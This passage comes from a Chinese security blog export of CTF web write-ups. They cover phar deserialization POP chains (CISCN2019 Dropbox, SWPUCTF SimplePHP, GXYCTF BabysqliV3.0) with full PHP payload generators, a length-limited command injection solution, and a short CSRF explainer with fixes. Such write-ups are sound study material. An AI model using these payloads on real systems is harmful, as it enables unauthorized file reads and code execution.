arrary(reset($_SESSION),&#39;welcome_to_the_lctf2018&#39;))</code></p><p>即<code>call_user_func（arrary(reset($_SESSION),&#39;welcome_to_the_lctf2018&#39;)）</code></p><p>即调用了reset($_SESSION)中的’welcome_to_the_lctf2018’方法</p><p>而reset($_SESSION)即是SoapClient对象，没有’welcome_to_the_lctf2018’方法，就触发了SoapClient::call方法,从而将flag保存到我们构造的cookie所对应的session中。</p></blockquote><p>第三次，将cookie设置为我们构造的cookie，获得对应的session</p><p><img src="/../images/image-20220730212228972-1687419234886.png" alt="image-20220730212228972"></p><h3 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h3><p>打开是登录页面，要么目标就是登录上去，要么就是登录后的功能有问题。</p><p>先找注册界面，有注册界面，那应该就是登陆后的功能有问题。</p><p>有一个文件上传，下载，删除功能。经测试，文件下载部分存在任意文件下载漏洞，通过此漏洞得到源码。</p><hr><p>代码审计：</p><p>因为buu上有phar标签，所以知道考的是phar。</p><p>反着找，先找文件函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span>.php下</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line"></span><br><span class="line"><span class="title class_">File</span>::<span class="variable constant_">close</span>调用了<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename)触发phar反序列化</span><br><span class="line">所以要构造filename=flag所在路径</span><br></pre></td></tr></table></figure><p>再看哪里调用了close方法：</p><ol><li><p>download.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">21</span>,<span class="number">17</span>:     <span class="keyword">echo</span> <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">但是这里限制了目录访问并过滤了flag，所以不能利用</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="title function_ invoke__">getcwd</span>() . <span class="string">&quot;:/etc:/tmp&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>) &amp;&amp; <span class="title function_ invoke__">stristr</span>(<span class="variable">$filename</span>, <span class="string">&quot;flag&quot;</span>) === <span class="literal">false</span>)</span><br></pre></td></tr></table></figure></li><li><p>class.php</p></li></ol><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title class_">User</span>::<span class="variable constant_">destruct</span></span><br><span class="line"><span class="number">57</span>,<span class="number">20</span>:         <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">所以猜测要让<span class="variable">$db</span>为File对象</span><br></pre></td></tr></table></figure><p>正着找</p><ol><li><p>index.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">FileList</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">Name</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">Size</span>();</span><br><span class="line">首先实例化了FileList类，然后调用了这个类中的Name和Size方法，但是FileList类中没有这两个方法，那么就会调用</span><br><span class="line">__call魔术方法</span><br></pre></td></tr></table></figure></li><li><p>查找FileList类是否有call方法</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Filelist</span>::<span class="variable constant_">call</span>：</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">__call方法的参数<span class="variable">$func</span>是被调用的不存在的方法名</span><br><span class="line">关注<span class="variable">$file</span>-&gt;<span class="variable">$func</span>()，调用了<span class="variable">$func</span>()</span><br></pre></td></tr></table></figure></li><li><p>$file是什么：往前看</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$filenames</span> <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">    <span class="comment">//知道$file是File对象</span></span><br><span class="line">            <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">            <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$path</span> . <span class="variable">$filename</span>);</span><br><span class="line">    <span class="comment">//知道files存放path下的所有文件对象($filenames = scandir($path);)</span></span><br><span class="line">            <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;files, <span class="variable">$file</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()] = <span class="keyword">array</span>();</span><br><span class="line"> &#125;   </span><br></pre></td></tr></table></figure></li><li><p>回看call方法</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="comment">//results[文件名][方法名]=File::$func的结果</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以Filelist::call就是当Filelist对象调用的方法不在Filelist类时，将该方法用File类重载，并把执行结果保存到Filelist.results中。<br>所以如果Filelist对象调用了close方法，就相当于调用了File.close()。<br>所以$db应该为Filelist对象，这样就可以调用File.close()</p></li><li><p>继续向下看</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)中关注</span></span><br><span class="line"><span class="function"><span class="title">foreach</span> (<span class="params"><span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$func</span> =&gt; <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">                <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$value</span>) . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">将方法结果保存到value即table中</span><br><span class="line">最后<span class="keyword">echo</span> <span class="variable">$table</span>;就相当于<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br></pre></td></tr></table></figure></li><li><p>到这里思路就清晰了。</p></li></ol><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">我们让User类中的<span class="variable">$db</span>为Filelist对象，当<span class="variable">$db</span>销毁时触发<span class="title class_">User</span>::<span class="title function_ invoke__">destruct</span>()方法，就会调用close方法，但是<span class="title class_">Filelist</span>::<span class="variable constant_">close</span>不存在，就会触发<span class="title class_">Filelist</span>::<span class="variable constant_">call</span>,从而调用<span class="title class_">File</span>::<span class="variable constant_">close</span>,执行<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>)，最后将结果返回输出。</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">            </span><br><span class="line">            <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">            <span class="variable">$file</span>-&gt;filename = <span class="string">&#x27;/flag.txt&#x27;</span>;<span class="comment"># 这里的flag.txt是多次猜测出来的</span></span><br><span class="line">            <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;files, <span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#让User类中的$db为Filelist对象</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$filelist</span> = <span class="keyword">new</span> <span class="title class_">FileList</span>();</span><br><span class="line"><span class="variable">$user</span>-&gt;db = <span class="variable">$filelist</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);  <span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$user</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最后将生成的phar.phar上传(直接修改文件后缀名后上传或者抓包修改content-type)为phar.gif，然后使用phar协议访问文件，有两个地方可以访问，download.php和delete.php，前面分析过dowmload.php对目录和文件名作了限制，所以使用delete.php来进行访问。</p><p><img src="/../images/image-20220708203217989-1687419234886.png" alt="image-20220708203217989"></p><h3 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h3><p>I&#x2F;O操作</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Test</span>::<span class="variable constant_">file_get</span></span><br><span class="line"><span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$value</span>))</span><br></pre></td></tr></table></figure><p>$value：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;params[<span class="variable">$key</span>];</span><br></pre></td></tr></table></figure><p>$key：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__get魔术方法</span><br><span class="line">找读取不存在/保护的属性</span><br><span class="line"></span><br><span class="line">show::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;</span><br><span class="line">让str[<span class="string">&#x27;str&#x27;</span>]为Test类，然后Test类下没有source属性就会触发<span class="title class_">Test</span>::<span class="variable constant_">__get</span></span><br><span class="line">所以<span class="variable">$key</span>=source</span><br><span class="line">    </span><br><span class="line">__toString方法</span><br><span class="line">C1e4r下的__destruct <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">令test为show</span><br></pre></td></tr></table></figure><p>POP链</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C1e4r::__destruct → Show::__toString → Test::__get → Test::get  → Test::file_get </span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">C1e4r</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="comment">//注意构造的顺序，从pop链尾到头</span></span><br><span class="line"><span class="variable">$c</span>-&gt;params=<span class="keyword">array</span>(<span class="string">&#x27;source&#x27;</span>=&gt;<span class="string">&#x27;/var/www/html/f1ag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;str=<span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;test.phar&quot;</span>);<span class="comment">//生成的压缩文件名为test.phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="GXYCTF2019-BabysqliV3-0"><a href="#GXYCTF2019-BabysqliV3-0" class="headerlink" title="[GXYCTF2019]BabysqliV3.0"></a>[GXYCTF2019]BabysqliV3.0</h4><p><a href="https://blog.csdn.net/qq_54929891/article/details/124785091">https://blog.csdn.net/qq_54929891/article/details/124785091</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Uploader类</span></span><br><span class="line"><span class="comment"># 如果name有赋值，并通过过滤，filename==name，如果没有，则filename=$sandbox.$_SESSION[&#x27;user&#x27;].$ext</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) <span class="keyword">and</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;Filename = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;Filename = <span class="variable">$sandbox</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>].<span class="variable">$ext</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$sandbox</span>;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$ext</span>;</span><br><span class="line"><span class="comment"># 返回name或者$sandbox.$_SESSION[&#x27;user&#x27;].$ext</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;Filename;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$sandbox</span>;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$ext</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;[^a-z0-9]&quot;</span>, <span class="variable">$this</span>-&gt;Filename))&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;illegal filename!&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1024</span>)&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;you are too big (â²â½`ã)&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;move_uploaded_file(&#x27;&quot;</span>.<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span> . <span class="variable language_">$this</span>-&gt;Filename . <span class="string">&quot;&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 每一次上传文件结束后触发</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;token != <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>])&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;check token falied!&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$uploader</span> = <span class="keyword">new</span> <span class="title class_">Uploader</span>();</span><br><span class="line"><span class="variable">$uploader</span>-&gt;<span class="title function_ invoke__">upload</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line"><span class="comment">#file_get_contents和echo都会触发tostring方法，所以实质上$uploader就等价于$filename</span></span><br><span class="line"><span class="keyword">if</span>(@<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uploader</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;ä¸é¢æ¯ä½ ä¸ä¼ çæä»¶ï¼&lt;br&gt;&quot;</span>.<span class="variable">$uploader</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uploader</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>第一次上传文件，没有回显，因为这时候name没有赋值，所以filename&#x3D;$sandbox.$_SESSION[‘user’].$ext，而且因为第一次还没触发destruct方法，所以上传的文件实质上是在tmp目录，因此<code>echo file_get_contents($uploader)</code>为空</p><p>第二次文件上传时，第一次结束触发destruct方法，就会把上一次上传的文件移到$filename路径，所以就会输出上一次上传的文件的内容。</p></blockquote><p>第一次随便上传文件，获取<code>$_SESSION[&#39;user&#39;]</code>，用于绕过</p><p>第二次上传phar文件</p><p>第三次用name参数用phar协议访问phar文件，通过<code>file_get_contents($uploader)</code>触发反序列化完成攻击</p><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="UUCTF-2022-新生赛-ezrce"><a href="#UUCTF-2022-新生赛-ezrce" class="headerlink" title="[UUCTF 2022 新生赛]ezrce"></a>[UUCTF 2022 新生赛]ezrce</h2><p>给出了一个命令执行接口，测试之后发现长度限制为6,正常思路</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">a</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221107112107946-1687675268129.png" alt="image-20221107112107946"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo 1</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221107112233686-1687675268129.png" alt="image-20221107112233686"></p><p>然后尝试访问&#x2F;tmp&#x2F;a，服务器没有报错，说明<code>&gt;a</code>其实是执行成功了的。</p><ul><li><p>解法1</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash"><span class="built_in">cp</span></span></span><br><span class="line">* /* .</span><br></pre></td></tr></table></figure><p>第一条命令创建一个文件名为cp的文件</p><p>第二条命令执行<code>cp /* .</code>，将根目录下的文件复制到当前目录下，然后访问&#x2F;tmp&#x2F;flag即可</p><p><img src="/../images/image-20221107113239425-1687675268129.png" alt="image-20221107113239425"></p></li><li><p>解法2</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash"><span class="built_in">nl</span></span></span><br><span class="line">* /*&gt;a</span><br></pre></td></tr></table></figure><p>第一条命令创建一个文件名为nl的文件</p><p>第二条命令执行<code>nl /*&gt;a</code>，读取根目录下所有文件的内容重定向到a中，然后访问&#x2F;tmp&#x2F;a即可</p><p><img src="/../images/image-20221107113608245-1687675268129.png" alt="image-20221107113608245"></p></li><li><p>解法3</p><p>直接写🐎</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CSRF</title>
      <link href="/2023/05/31/CSRF/"/>
      <url>/2023/05/31/CSRF/</url>
      
        <content type="html"><![CDATA[<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>攻击者伪造用户的请求，诱导用户点击恶意链接，利用用户的cookie让服务器以为是用户操作，从而发起攻击。</p><p><img src="/../images/image-20230321141146612.png" alt="image-20230321141146612"></p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>web应用程序在用户进行敏感操作时，没有进行身份验证，从而导致恶意攻击者利用普通用户的身份（cookie）完成攻击行为。</p><h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>伪造用户请求，用户能做啥，这个漏洞就能做啥</p><h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><ul><li>数据包无token和referer验证</li></ul><p>无token验证并且无referer验证时，就基本存在跨站请求伪造，但基于功能点不同，一些为无意义无危害的跨站请求伪造。</p><p>提交数据包时抓包删除referer字段，如果不报错，则基本存在跨域请求伪造，GET型构造链接，POST型写一个提交表单，测试有跨域情况下提交的数据包是否生效。</p><ul><li>数据包无token有referer验证</li></ul><p>只有referer验证时，可尝试空referer，或者尝试域名伪造。</p><ul><li>burp自带的csrf检测功能</li></ul><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><blockquote><p>关键点在于</p><p>攻击者可以预先伪造用户的请求，所以只需要使得请求参数难以伪造。</p></blockquote><ul><li><p>当用户发送重要的请求时需要输入原始密码，手机验证码等</p></li><li><p>设置Token</p></li><li><p>检验 referer 来源</p><p>疑问：referer不是可以进行伪造吗？</p><p>答：攻击者确实可以在发送请求时进行伪造，但是csrf是用户发起请求，用户不会去伪造；</p><p>不过当网站本身可以植入csrf的payload时，检验refer来源的防御手段就失效了。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HNCTF 2022</title>
      <link href="/2023/05/31/HNCTF/"/>
      <url>/2023/05/31/HNCTF/</url>
      
        <content type="html"><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="HNCTF-2022-WEEK3-Fun-php"><a href="#HNCTF-2022-WEEK3-Fun-php" class="headerlink" title="[HNCTF 2022 WEEK3]Fun_php"></a>[HNCTF 2022 WEEK3]Fun_php</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$getUserID</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>]; </span><br><span class="line"><span class="variable">$getpass</span> = (<span class="keyword">int</span>)@<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]; </span><br><span class="line"><span class="variable">$getmySaid</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;mySaid&#x27;</span>]; </span><br><span class="line"><span class="variable">$getmyHeart</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;myHeart&#x27;</span>]; </span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="variable">$verify</span> =@<span class="variable">$_POST</span>[<span class="string">&#x27;verify&#x27;</span>];</span><br><span class="line"><span class="variable">$want</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;want&#x27;</span>];</span><br><span class="line"><span class="variable">$final</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;final&#x27;</span>];</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$getUserID</span>))</span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$user</span> + <span class="variable">$getUserID</span>; <span class="comment">//u5er_D0_n0t_b3g1n_with_4_numb3r</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span> == <span class="number">114514</span> &amp;&amp; <span class="variable">$getpass</span> == <span class="variable">$pass</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">ctype_alpha</span>(<span class="variable">$getmySaid</span>)) </span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$getmyHeart</span>)) </span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$getmySaid</span>) != <span class="title function_ invoke__">md5</span>(<span class="variable">$getmyHeart</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Cheater!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span 